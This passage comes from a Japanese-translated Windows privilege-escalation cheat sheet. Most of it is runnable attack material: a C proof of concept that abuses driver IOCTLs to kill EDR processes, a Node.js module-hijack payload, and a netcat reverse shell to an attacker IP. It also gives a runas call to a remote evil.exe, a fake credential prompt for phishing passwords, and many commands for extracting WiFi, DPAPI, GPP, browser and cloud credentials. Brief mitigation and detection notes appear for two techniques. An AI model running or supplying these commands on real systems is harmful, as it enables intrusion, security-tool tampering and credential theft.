Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ は `plugins` サブフォルダ内の任意の plugin DLL を自動読み込みします。書き込み可能な portable/copy install がある場合、悪意のある plugin を配置すると、起動するたびに `notepad++.exe` 内で自動的に code execution できます（`DllMain` と plugin callbacks からも可能）。

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**別のユーザーによって実行される registry や binary を上書きできないか確認してください。**\
**権限昇格のための興味深い autoruns locations について学ぶには、以下のページを読んでください:**


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

**サードパーティの奇妙な / 脆弱な** drivers を探してください
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
ドライバが任意の kernel read/write primitive を公開している場合（設計の悪い IOCTL handler でよくある）、kernel memory から SYSTEM token を直接盗むことで権限昇格できます。手順の詳細はここを参照してください:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

脆弱な呼び出しが attacker-controlled な Object Manager path を開く race-condition bug では、lookup を意図的に遅くすることで（max-length の component や深い directory chain を使う）、window を microseconds から tens of microseconds まで広げられます:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern hive vulnerabilities では、deterministic layout を groom し、書き込み可能な HKLM/HKU descendants を abuse し、custom driver なしで metadata corruption を kernel paged-pool overflow に変換できます。完全な chain はここで学べます:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### device objects での missing FILE_DEVICE_SECURE_OPEN の abuse (LPE + EDR kill)

一部の署名済み third-party drivers は、strong SDDL を使って IoCreateDeviceSecure で device object を作成する一方、DeviceCharacteristics に FILE_DEVICE_SECURE_OPEN を設定し忘れます。この flag がないと、device が余分な component を含む path から開かれたときに secure DACL が enforced されず、権限のないユーザーでも次のような namespace path を使って handle を取得できます:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (実際のケース)

ユーザーが device を open できるようになると、driver が公開する privileged IOCTLs を LPE や tampering に abuse できます。実環境で観測された capability の例:
- 任意の process に full-access handle を返す（token theft / DuplicateTokenEx/CreateProcessAsUser による SYSTEM shell）。
- raw disk の read/write を無制限に実行（offline tampering、boot-time persistence の trick）。
- Protected Process/Light (PP/PPL) を含む任意の process を terminate し、kernel 経由で user land から AV/EDR kill を可能にする。

最小限の PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
開発者向けの緩和策
- DACL によって制限されることを意図した device object を作成する際は、常に FILE_DEVICE_SECURE_OPEN を設定する。
- 特権操作に対して caller context を検証する。process termination や handle return を許可する前に PP/PPL チェックを追加する。
- IOCTL を制約する（access masks、METHOD_*、input validation）し、直接の kernel privileges ではなく brokered models を検討する。

防御側向けの検知アイデア
- 疑わしい device 名（例: \\ .\\amsdk*）への user-mode open と、悪用を示唆する特定の IOCTL シーケンスを監視する。
- Microsoft の vulnerable driver blocklist（HVCI/WDAC/Smart App Control）を適用し、自前の allow/deny lists を維持する。


## PATH DLL Hijacking

**PATH に含まれるフォルダ内に書き込み権限がある**場合、process が読み込む DLL を hijack して **privileges を escalate** できる可能性がある。

PATH 内のすべてのフォルダの権限を確認する：
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
このチェックを悪用する方法の詳細については:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## `C:\node_modules` 経由の Node.js / Electron module resolution hijacking

これは **Windows uncontrolled search path** の変種で、**Node.js** および **Electron** アプリケーションが `require("foo")` のような bare import を行い、期待される module が **missing** の場合に影響します。

Node はディレクトリツリーを上方向にたどり、各親ディレクトリで `node_modules` フォルダを確認して package を解決します。Windows ではその探索がドライブのルートまで到達できるため、`C:\Users\Administrator\project\app.js` から起動されたアプリケーションは、最終的に次を調べることになります:

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

**low-privileged user** が `C:\node_modules` を作成できる場合、悪意ある `foo.js`（または package フォルダ）を配置し、**より高い権限の Node/Electron process** が欠落した dependency を解決するのを待てます。payload は被害者 process の security context で実行されるため、対象が administrator として、昇格した scheduled task/service wrapper から、または自動起動する privileged desktop app から実行される場合は、これは **LPE** になります。

これは特に次の場合によく発生します:

- dependency が `optionalDependencies` に宣言されている
- サードパーティ library が `try/catch` で `require("foo")` を包み、失敗しても処理を継続する
- package が production builds から削除された、packaging 中に含まれなかった、または install に失敗した
- 脆弱な `require()` が main application code ではなく dependency tree の深い場所にある

### 脆弱な対象の探索

**Procmon** を使って resolution path を証明します:

- `Process Name` を target executable（`node.exe`、Electron app の EXE、または wrapper process）にフィルタ
- `Path` が `node_modules` を `contains` するようにフィルタ
- `NAME NOT FOUND` と `C:\node_modules` 配下での最終的な成功した open に注目

展開された `.asar` ファイルや application sources における有用な code-review patterns:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Exploitation

1. Procmon またはソースレビューから **欠けているパッケージ名** を特定する。
2. まだ存在しない場合は、ルート検索ディレクトリを作成する:
```powershell
mkdir C:\node_modules
```
3. 正確に期待される名前の module を配置する:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. 被害者アプリケーションを起動する。アプリケーションが `require("foo")` を試み、正規のモジュールが存在しない場合、Node は `C:\node_modules\foo.js` を読み込む可能性がある。

このパターンに当てはまる、実際に見られる欠落した optional modules の例としては `bluebird` や `utf-8-validate` があるが、再利用できる部分は **technique** そのものだ。特権のある Windows Node/Electron プロセスが解決する **missing bare import** を見つければよい。

### Detection and hardening ideas

- ユーザーが `C:\node_modules` を作成したり、そこに新しい `.js` ファイルや package を書き込んだら alert する。
- `C:\node_modules\*` から読み込む high-integrity processes を hunt する。
- production では runtime dependencies をすべて package に含め、`optionalDependencies` の使用を audit する。
- `try { require("...") } catch {}` のような黙って失敗するパターンがないか third-party code を review する。
- ライブラリが対応している場合は optional probes を無効化する（たとえば、いくつかの `ws` deployments では `WS_NO_UTF_8_VALIDATE=1` を使って legacy の `utf-8-validate` probe を避けられる）。

## Network

### Shares
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file にハードコードされている、既知の他のコンピュータがないか確認する
```
type C:\Windows\System32\drivers\etc\hosts
```
### Network Interfaces & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Open Ports

外部から**制限されたサービス**を確認する
```bash
netstat -ano #Opened ports?
```
### ルーティングテーブル
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARPテーブル
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### ファイアウォールルール

[**ファイアウォール関連のコマンドはこのページを確認してください**](../basic-cmd-for-pentesters.md#firewall) **(ルール一覧、ルール作成、無効化、無効化...)**

[ネットワーク列挙用のコマンドはこちら](../basic-cmd-for-pentesters.md#network) でさらに

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` は `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` にも見つかります

root user を取得できれば、任意のポートで待ち受けできます（最初に `nc.exe` を使ってポートで待ち受けすると、GUI で `nc` を firewall に許可するかどうかを確認されます）。
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
bash を root として簡単に起動するには、`--default-user root` を試せます

`WSL` のファイルシステムは、フォルダ `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` で確認できます

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault は、**Windows** がユーザーに**自動的にログインできる**サーバー、Webサイト、その他のプログラム向けのユーザー認証情報を保存します。最初は、ユーザーが Facebook の認証情報、Twitter の認証情報、Gmail の認証情報などを保存して、ブラウザ経由で自動ログインできるようにするものに見えるかもしれません。しかし、そうではありません。

Windows Vault は、Windows がユーザーに自動的にログインできる認証情報を保存します。つまり、リソース（サーバーまたは Webサイト）にアクセスするために認証情報を必要とする **Windows アプリケーションは、この Credential Manager** と Windows Vault を利用し、毎回ユーザーがユーザー名とパスワードを入力する代わりに、提供された認証情報を使うことができます。

アプリケーションが Credential Manager と連携しない限り、特定のリソースの認証情報を使うことはできないと思います。したがって、アプリケーションが vault を利用したい場合は、何らかの方法で **credential manager と通信し、デフォルトの storage vault からそのリソースの認証情報を要求する** 必要があります。

`cmdkey` を使って、マシン上に保存されている認証情報を一覧表示します。
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Then you can use `runas` with the `/savecred` options in order to use the saved credentials. The following example is calling a remote binary via an SMB share.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
提供された認証情報を使って `runas` を使用する。
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Note that mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), or from [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

**Data Protection API (DPAPI)** は、主に Windows オペレーティングシステム内で非対称秘密鍵の対称暗号化に使用される、データの対称暗号化方式を提供する。 この暗号化は、ユーザーまたはシステムの secret を利用してエントロピーを大きく高める。

**DPAPI は、ユーザーのログイン secrets から導出された対称鍵を通じて鍵の暗号化を可能にする**。 システム暗号化のシナリオでは、システムのドメイン認証 secrets を利用する。

DPAPI を使用して暗号化されたユーザーの RSA keys は、%APPDATA%\Microsoft\Protect\{SID} ディレクトリに保存される。ここで {SID} はユーザーの [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) を表す。 **DPAPI key は、同じファイル内でユーザーの private keys を保護する master key と同じ場所に置かれ**、通常 64 bytes のランダムデータで構成される。（このディレクトリへのアクセスは制限されており、CMD の `dir` コマンドでは内容を一覧表示できないが、PowerShell では一覧表示できる点に注意が必要である）。
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
**mimikatz module** `dpapi::masterkey` を適切な引数 (`/pvk` または `/rpc`) と一緒に使って復号できます。

**master password** で保護された **credentials files** は通常、次の場所にあります:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
You can use **mimikatz module** `dpapi::cred` with the appropiate `/masterkey` to decrypt.\
You can **extract many DPAPI** **masterkeys** from **memory** with the `sekurlsa::dpapi` module (if you are root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** は、**scripting** や automation タスクで、暗号化された credentials を便利に保存する方法としてよく使われます。これらの credentials は **DPAPI** によって保護されており、通常は作成された同じ computer 上の同じ user だけが復号できます。

ファイルに含まれている PS credentials を **decrypt** するには、次のようにします:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### 保存された RDP 接続

それらは `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
および `HKCU\Software\Microsoft\Terminal Server Client\Servers\` にあります。

### 最近実行されたコマンド
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Remote Desktop Credential Manager**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

People often use the StickyNotes app on Windows workstations to **save passwords** and other information, not realizing it is a database file. This file is located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` and is always worth searching for and examining.

### AppCmd.exe

**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**\
**AppCmd.exe** is located in the `%systemroot%\system32\inetsrv\` directory.\
If this file exists then it is possible that some **credentials** have been configured and can be **recovered**.

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` が存在するか確認する .\
インストーラーは **SYSTEM権限で実行され**, 多くは **DLL Sideloading に脆弱 (情報は** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Files and Registry (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys in registry

SSH private keys can be stored inside the registry key `HKCU\Software\OpenSSH\Agent\Keys` なので、そこに何か興味深いものがないか確認してください:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
その path 内にエントリが見つかれば、おそらく保存された SSH key です。これは encrypted されていますが、[https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) を使えば簡単に decrypt できます。\
この technique についての詳細はこちら: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

`ssh-agent` service が running していない場合で、boot 時に自動的に start させたいなら次を実行します:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> この手法はもう有効ではないようです。いくつかの ssh keys を作成し、`ssh-add` で追加して ssh 経由でマシンに login しようとしました。registry の HKCU\Software\OpenSSH\Agent\Keys は存在せず、procmon でも非対称鍵認証中に `dpapi.dll` の使用は特定されませんでした。

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
**metasploit** を使って、これらのファイルを検索することもできます: _post/windows/gather/enum_unattend_

Example content:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM バックアップ
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud Credentials
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

**SiteList.xml** という名前のファイルを検索する

### Cached GPP Pasword

以前は、Group Policy Preferences (GPP) を使って、複数のマシンにカスタムのローカル管理者アカウントを展開できる機能がありました。しかし、この方法には重大なセキュリティ上の欠陥がありました。まず、SYSVOL に XML ファイルとして保存される Group Policy Objects (GPOs) は、ドメインユーザーなら誰でもアクセスできました。次に、これらの GPP 内のパスワードは、公開文書化されたデフォルトキーを使って AES256 で暗号化されていましたが、認証済みユーザーなら誰でも復号できました。これは、ユーザーが昇格した権限を取得できる可能性があるため、深刻なリスクでした。

このリスクを軽減するために、空でない "cpassword" フィールドを含むローカルにキャッシュされた GPP ファイルをスキャンする関数が作成されました。そのようなファイルが見つかると、その関数はパスワードを復号し、カスタムの PowerShell オブジェクトを返します。このオブジェクトには GPP の詳細とファイルの場所が含まれており、このセキュリティ脆弱性の特定と修正に役立ちます。

これらのファイルを `C:\ProgramData\Microsoft\Group Policy\history` または _**`C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history` (previous to W Vista)_ で検索する:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword を復号するには:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
`crackmapexec`を使用してパスワードを取得する:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
credentials を含む web.config の例:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN認証情報
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### ログ
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### 認証情報を求める

**ユーザーに自分の認証情報、または別のユーザーの認証情報を入力するよう求める**ことはいつでもできます。相手がそれらを知っていると思うならです（注意：クライアントに直接**認証情報**を**尋ねる**のは本当に**危険**です）:
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **認証情報を含む可能性のあるファイル名**

過去に **平文** または **Base64** で **passwords** を含んでいたことが知られているファイル
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
すべての提案されたファイルを検索してください:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBin 内の Credentials

Bin も確認して、その中にある credentials を探すべきです

いくつかの program に保存された **passwords** を recover するには、これを使えます: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### registry 内

**credentials を含む他の可能性のある registry keys**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**registry から openssh keys を抽出します。**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Browsers History

**Chrome or Firefox** に保存されているパスワードの dbs を確認してください。\
また、ブラウザの履歴、ブックマーク、favourites も確認してください。そこに **passwords are** 保存されている可能性があります。

ブラウザからパスワードを抽出するツール:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** は、Windows operating system に組み込まれた technology で、異なる language の software components 間の **intercommunication** を可能にします。各 COM component は **class ID (CLSID)** によって **identified via** され、各 component は 1 つ以上の interfaces を通じて機能を公開し、それらは interface IDs (IIDs) で識別されます。

